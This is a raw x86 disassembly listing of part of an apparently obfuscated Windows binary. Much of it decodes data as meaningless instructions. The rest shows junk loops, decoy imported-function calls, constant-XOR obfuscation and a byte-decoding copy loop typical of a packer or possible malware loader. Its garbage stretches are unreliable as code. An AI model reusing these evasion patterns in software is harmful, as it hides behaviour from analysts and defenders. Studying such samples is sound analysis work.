  403a29:	shr    DWORD PTR [edi],cl
  403a2b:	sbb    eax,0xdd5febad
  403a30:	mov    al,0xb3
  403a32:	lock jnp 0x403a8c
  403a35:	gs jne 0x403a6d
  403a38:	cmc    
  403a39:	or     edi,DWORD PTR [ebp+esi*1-0x38e761c0]
  403a40:	sbb    eax,0x7dde77a
  403a45:	rcl    bl,0xef
  403a48:	mov    ds,WORD PTR [eax]
  403a4a:	fidiv  DWORD PTR [ebx-0x4a7a1662]
  403a50:	(bad)  
  403a51:	mov    cl,0xf7
  403a53:	and    edx,ebp
  403a55:	adc    esp,edi
  403a57:	add    eax,0xbc0f5de6
  403a5c:	es enter 0x1493,0x2e
  403a61:	cdq    
  403a62:	sub    dl,dh
  403a64:	add    DWORD PTR ds:0x9700d60,eax
  403a6a:	aaa    
  403a6b:	dec    esi
  403a6c:	xchg   edi,eax
  403a6d:	sub    ebx,esi
  403a6f:	fcmovnbe st,st(0)
  403a71:	cmp    al,0x8f
  403a73:	jp     0x403a8d
  403a75:	xchg   esp,eax
  403a76:	dec    esp
  403a77:	clc    
  403a78:	push   ecx
  403a79:	xor    ecx,DWORD PTR [edx+edx*2+0x73456850]
  403a80:	call   0x589aa556
  403a85:	out    0x80,al
  403a87:	adc    al,0x1
  403a89:	inc    esi
  403a8a:	jmp    0x9889:0x8461108b
  403a91:	lahf   
  403a92:	adc    ecx,ebx
  403a94:	push   eax
  403a95:	lahf   
  403a96:	mov    ebx,DWORD PTR [edi+0x65cceb30]
  403a9c:	ds adc bh,bl
  403a9f:	loop   0x403ae0
  403aa1:	add    cl,BYTE PTR [esi+0x23]
  403aa4:	addr16 aas 
  403aa6:	(bad)  
  403aa7:	sahf   
  403aa8:	dec    ecx
  403aa9:	shr    DWORD PTR [esi+0xdd70ea3],1
  403aaf:	mov    bh,0x7f
  403ab1:	sbb    eax,0x991ab4a7
  403ab6:	lods   eax,DWORD PTR ds:[esi]
  403ab7:	mov    cl,0x19
  403ab9:	dec    ebx
  403aba:	inc    esp
  403abb:	call   0xe24d69cb
  403ac0:	mov    esp,DWORD PTR [ecx+0x5ec37905]
  403ac6:	add    al,BYTE PTR [ebx+0x5e0a2173]
  403acc:	add    BYTE PTR [edx-0x6f5c307c],0x56
  403ad3:	jmp    0xaf7921b9
  403ad8:	aaa    
  403ad9:	out    0x22,eax
  403adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403adc:	test   DWORD PTR ds:0xabad2b7e,edx
  403ae2:	pop    eax
  403ae3:	pop    ebp
  403ae4:	adc    eax,0x2b27c6ca
  403ae9:	pop    esi
  403aea:	fstp   TBYTE PTR [ecx+eax*4+0x56ed7e9d]
  403af1:	rol    BYTE PTR ds:0x70805f,cl
  403af7:	sbb    ecx,eax
  403af9:	pop    edi
  403afa:	dec    ecx
  403afb:	and    ah,0x39
  403afe:	and    BYTE PTR [edi-0x80],0x19
  403b02:	adc    al,0xe0
  403b04:	push   eax
  403b05:	shl    DWORD PTR [ebp+0x62],1
  403b08:	xor    edx,DWORD PTR [ebp+0x20]
  403b0b:	jg     0x403ab4
  403b0d:	mov    edi,ebx
  403b0f:	or     bh,dl
  403b11:	push   edx
  403b12:	(bad)  
  403b14:	ret    0xdb37
  403b17:	aas    
  403b18:	sub    eax,0x5df5010d
  403b1d:	jmp    0x7bac5a97
  403b22:	or     ebx,ecx
  403b24:	inc    eax
  403b25:	inc    esp
  403b26:	mov    ebx,0x48dcdeab
  403b2b:	pop    edx
  403b2c:	push   ebp
  403b2d:	cmp    edx,edi
  403b2f:	ja     0x403b3f
  403b31:	out    0xcd,al
  403b33:	and    DWORD PTR [eax],ecx
  403b35:	int    0xbb
  403b37:	mov    al,0x33
  403b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b3a:	sbb    eax,0x4c272b7b
  403b3f:	aaa    
  403b40:	repnz daa 
  403b42:	sub    BYTE PTR [ecx+0x31],0xad
  403b46:	add    eax,0x64cf47cd
  403b4b:	fwait
  403b4c:	inc    ecx
  403b4d:	retf   
  403b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b50:	pushf  
  403b51:	in     al,dx
  403b52:	mov    esi,0x89453fed
  403b57:	jae    0x403ae4
  403b59:	adc    al,BYTE PTR [esi+0x77]
  403b5c:	mov    edx,edi
  403b5e:	shl    BYTE PTR ds:[ebp+ebp*2-0x178615c3],1
  403b66:	push   edi
  403b67:	mov    BYTE PTR [ecx],0xe5
  403b6a:	ffreep st(1)
  403b6c:	mov    ebp,0xbbd4dbcf
  403b71:	pop    ss
  403b72:	fcom   st(0)
  403b74:	xchg   esp,eax
  403b75:	(bad)  
  403b76:	jmp    0xb61d:0x4886cb9a
  403b7d:	or     esp,0x5c
  403b80:	xchg   esi,eax
  403b81:	inc    eax
  403b82:	pop    ecx
  403b83:	cmp    al,0x2c
  403b85:	xor    edi,DWORD PTR [edx+ebx*8-0x41c313f3]
  403b8c:	xor    ebx,eax
  403b8e:	xor    eax,0x1d179ba4
  403b93:	sub    DWORD PTR [ecx],ebp
  403b95:	test   BYTE PTR [ebx],dl
  403b97:	or     ebx,ebx
  403b99:	popf   
  403b9a:	lahf   
  403b9b:	mov    ebx,0x992ee51
  403ba0:	pushf  
  403ba1:	mov    dl,BYTE PTR [edx+0x623d2d8e]
  403ba7:	mov    edx,DWORD PTR [ecx+0x78]
  403baa:	daa    
  403bab:	rcr    BYTE PTR [edx-0x5046f249],cl
  403bb1:	inc    eax
  403bb2:	leave  
  403bb3:	shl    DWORD PTR [esi-0x47],0xba
  403bb7:	loope  0x403bc2
  403bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bba:	jmp    0xec94cac1
  403bbf:	rol    BYTE PTR [edi],1
  403bc1:	mov    edi,0xe67d7339
  403bc6:	aaa    
  403bc7:	cs fwait
  403bc9:	xor    esi,DWORD PTR [edx+0x37]
  403bcc:	int3   
  403bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bce:	je     0x403c23
  403bd0:	inc    edi
  403bd1:	bnd jnp 0x403c42
  403bd4:	hlt    
  403bd5:	ret    
  403bd6:	sbb    al,al
  403bd8:	stos   BYTE PTR es:[edi],al
  403bd9:	push   esp
  403bda:	pop    esi
  403bdb:	fild   DWORD PTR [ecx]
  403bdd:	ds jmp 0x1074:0x71949138
  403be5:	into   
  403be6:	pop    esi
  403be7:	ret    
  403be8:	cwde   
  403be9:	xor    eax,0xd95582fb
  403bee:	mov    BYTE PTR [edi+0x17],bl
  403bf1:	cmc    
  403bf2:	dec    edx
  403bf3:	lea    esi,[edx-0x1e]
  403bf6:	xchg   ecx,eax
  403bf7:	les    edx,FWORD PTR [edx+0x35b1a1d]
  403bfd:	in     eax,0x53
  403bff:	repz or ch,ah
  403c02:	lods   eax,DWORD PTR ds:[esi]
  403c03:	leave  
  403c04:	mov    bh,0xed
  403c06:	test   DWORD PTR [eax+0x4647d31d],ecx
  403c0c:	enter  0xd816,0x52
  403c10:	jbe    0x403c3d
  403c12:	or     al,0x35
  403c14:	jns    0x403b97
  403c16:	inc    edx
  403c17:	nop
  403c18:	add    eax,0xd621da46
  403c1d:	repz dec edi
  403c1f:	es aam 0xa4
  403c22:	outs   dx,BYTE PTR ds:[esi]
  403c23:	adc    BYTE PTR [ecx],al
  403c25:	jg     0x403bcc
  403c27:	sbb    DWORD PTR [edx+eax*1-0x6a],ebx
  403c2b:	or     eax,0x1d184d1b
  403c30:	mov    esp,0xfcc216d6
  403c35:	in     eax,dx
  403c36:	rol    DWORD PTR [edx+eax*4+0x72],1
  403c3a:	pop    es
  403c3b:	out    0xba,eax
  403c3d:	jb     0x403ca6
  403c3f:	pop    eax
  403c40:	pop    edi
  403c41:	sub    BYTE PTR [eax+0x5af88e0b],dh
  403c47:	push   0xfd426cdc
  403c4c:	sbb    BYTE PTR ds:0xd17b2572,bh
  403c52:	jmp    0xd9e2fbd5
  403c57:	mov    esp,0x54828d5
  403c5c:	sbb    eax,0x3500d70a
  403c61:	loope  0x403c3f
  403c63:	pop    edx
  403c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c65:	and    al,0x6d
  403c67:	mov    ch,0x73
  403c69:	add    bh,BYTE PTR [eax]
  403c6b:	mov    esp,0xdcbf3601
  403c70:	inc    ecx
  403c71:	retf   0xe7aa
  403c74:	in     al,0x2d
  403c76:	ins    BYTE PTR es:[edi],dx
  403c77:	mov    al,ds:0xbcb11e8a
  403c7c:	fadd   QWORD PTR [esi+0x2d]
  403c7f:	mov    eax,ds:0x4d89c833
  403c84:	or     BYTE PTR [ebx+0x558b084d],cl
  403c8a:	or     BYTE PTR [ebx],dh
  403c8c:	enter  0xd269,0xf5
  403c90:	or     BYTE PTR [edi+0x0],dl
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff1f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0xbc9c947b
  4042a6:	push   ds
  4042a7:	jne    0x4042a3
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x9]
  4042b2:	rcr    DWORD PTR [ecx+0x5a1c28a3],cl
  4042b8:	aam    0x91
  4042ba:	bound  eax,QWORD PTR [edx-0x711acdc1]
  4042c0:	inc    ebp
  4042c1:	add    DWORD PTR [ecx],eax
  4042c3:	lock mov ah,0xb7
  4042c6:	data16 shl BYTE PTR [edi],0xf4
  4042ca:	ficom  WORD PTR [ebp-0x3652e5ef]
  4042d0:	add    BYTE PTR [eax],0xf0
  4042d3:	iret   
  4042d4:	fistp  WORD PTR [ecx-0x1ea7498b]
  4042da:	mov    BYTE PTR ds:0x67369820,ah
  4042e0:	add    dl,BYTE PTR [ecx-0x70]
  4042e3:	mov    DWORD PTR [ebx+0x2b],edx
  4042e6:	dec    edx
  4042e7:	call   0xe47e9d8a
  4042ec:	xchg   edi,eax
  4042ed:	outs   dx,BYTE PTR es:[esi]
  4042ef:	push   0xffffffbc
  4042f1:	xor    esi,eax
  4042f3:	xor    al,0x9c
  4042f5:	lock cli 
  4042f7:	mov    eax,0xb4bb50c6
  4042fc:	mov    al,0xbe
  4042fe:	aam    0xb2
  404300:	and    ecx,ebx
  404302:	packssdw mm0,QWORD PTR [edi+esi*4]
  404306:	jbe    0x40437f
  404308:	dec    eax
  404309:	nop
  40430a:	mov    esp,DWORD PTR [eax-0x68d1881d]
  404310:	pop    esi
  404311:	hlt    
  404312:	jae    0x40436b
  404314:	mov    edi,0xc091d73
  404319:	cmp    al,0x84
  40431b:	(bad)  
  40431c:	and    ecx,edx
  40431e:	aam    0x9b
  404320:	xchg   esi,eax
  404321:	mov    dh,0x3e
  404323:	and    ah,BYTE PTR [ebx+0xec7ccd6]
  404329:	stos   DWORD PTR es:[edi],eax
  40432a:	ins    DWORD PTR es:[edi],dx
  40432b:	loop   0x4042d3
  40432d:	retf   0x7a31
  404330:	xchg   esp,eax
  404331:	push   edi
  404332:	inc    esp
  404333:	mov    bl,0xe8
  404335:	fsub   QWORD PTR [edi]
  404337:	or     al,0x2f
  404339:	mov    eax,ds:0x88631f91
  40433e:	jo     0x40431c
  404340:	xlat   BYTE PTR ds:[ebx]
  404341:	mov    esi,0xdbdf70f2
  404346:	jl     0x40431d
  404348:	mov    esi,0xe8de1567
  40434d:	inc    edx
  40434e:	fnstsw WORD PTR [ebx]
  404350:	(bad)  
  404351:	mov    ebx,0x78b27a2
  404356:	sub    DWORD PTR [ecx-0x28],ecx
  404359:	or     eax,0xc3ee4fcb
  40435e:	ja     0x4042ed
  404360:	scas   al,BYTE PTR es:[edi]
  404361:	lods   al,BYTE PTR ds:[esi]
  404362:	push   edx
  404363:	xchg   ecx,eax
  404364:	mov    ebp,ebp
  404366:	sbb    eax,0x70810beb
  40436b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40436c:	push   esp
  40436d:	cld    
  40436e:	xor    eax,DWORD PTR [ebx]
  404370:	lock xchg ebx,eax
  404372:	xchg   edi,eax
  404373:	das    
  404374:	xchg   edx,eax
  404375:	int    0xae
  404377:	sbb    ecx,DWORD PTR [eax]
  404379:	jne    0x4043b1
  40437b:	shr    BYTE PTR ds:0xa84871ae,0xbf
  404382:	repnz scas eax,DWORD PTR es:[edi]
  404384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404385:	push   eax
  404386:	mov    ebx,0xb3c2d52f
  40438b:	xchg   esp,eax
  40438c:	inc    esi
  40438d:	inc    esp
  40438e:	and    ecx,DWORD PTR [ecx-0x5b31aeb]
  404394:	lods   al,BYTE PTR ds:[esi]
  404395:	ins    BYTE PTR es:[edi],dx
  404396:	jb     0x40431b
  404398:	mov    edi,DWORD PTR [esi-0x5]
  40439b:	jns    0x404324
  40439d:	and    bl,dl
  40439f:	test   cl,bl
  4043a1:	mov    cl,0x2
  4043a3:	aam    0x19
  4043a5:	mov    ebx,0x59fba71
  4043aa:	mov    WORD PTR [edi-0x7dec48a3],fs
  4043b0:	leave  
  4043b1:	mov    esp,0x6005bfd5
  4043b6:	sub    al,0xcd
  4043b8:	(bad)  
  4043b9:	in     eax,dx
  4043ba:	dec    edi
  4043bb:	cdq    
  4043bc:	and    esp,DWORD PTR [esi-0x31]
  4043bf:	(bad)  
  4043c0:	and    DWORD PTR [ebx+0x1f],ebx
  4043c3:	or     eax,0x74d8b850
  4043c8:	test   BYTE PTR [esi-0x606e5d73],ah
  4043ce:	ss and eax,0x6e24a333
  4043d4:	xor    ch,BYTE PTR [ecx+0x2a]
  4043d7:	ins    BYTE PTR es:[edi],dx
  4043d8:	dec    ebp
  4043d9:	mov    ch,BYTE PTR [ecx-0x27]
  4043dc:	loopne 0x4043b9
  4043de:	lods   al,BYTE PTR ds:[esi]
  4043df:	jae    0x404387
  4043e1:	push   ebx
  4043e2:	aam    0xa7
  4043e4:	dec    edx
  4043e5:	jle    0x404451
  4043e7:	cmp    BYTE PTR [ecx-0x13],dh
  4043ea:	mov    eax,0xc2e106d5
  4043ef:	out    dx,eax
  4043f0:	xor    al,0x2a
  4043f2:	pop    edx
  4043f3:	les    ecx,FWORD PTR [esi]
  4043f5:	fs pop ds
  4043f7:	adc    edi,DWORD PTR [ebx-0x427124f9]
  4043fd:	or     BYTE PTR [eax+0x30134834],0xdd
  404404:	dec    esp
  404405:	inc    ecx
  404406:	ror    dh,cl
  404408:	in     al,dx
  404409:	mov    ebx,0xae1aad71
  40440e:	mov    cl,0xf9
  404410:	jle    0x404420
  404412:	push   ebp
  404413:	stos   BYTE PTR es:[edi],al
  404414:	fst    QWORD PTR [ecx]
  404416:	xor    DWORD PTR [edi+0x64e0d3e9],eax
  40441c:	fidivr WORD PTR [edx+0x292c6e22]
  404422:	lods   al,BYTE PTR ds:[esi]
  404423:	mov    al,ds:0x113a9bd6
  404428:	mov    ebx,cs
  40442a:	pop    es
  40442b:	adc    DWORD PTR [esi],0xffffff83
  40442e:	rol    ebx,cl
  404430:	ja     0x404408
  404432:	lea    eax,[ecx+0x2bf97f65]
  404438:	in     al,0x98
  40443a:	cs ins BYTE PTR es:[edi],dx
  40443c:	ret    0x45b5
  40443f:	sbb    eax,0xb07c6b98
  404444:	das    
  404445:	dec    ecx
  404446:	cmp    BYTE PTR [edi+eiz*1-0x5d],ah
  40444a:	or     al,0xf5
  40444c:	out    dx,eax
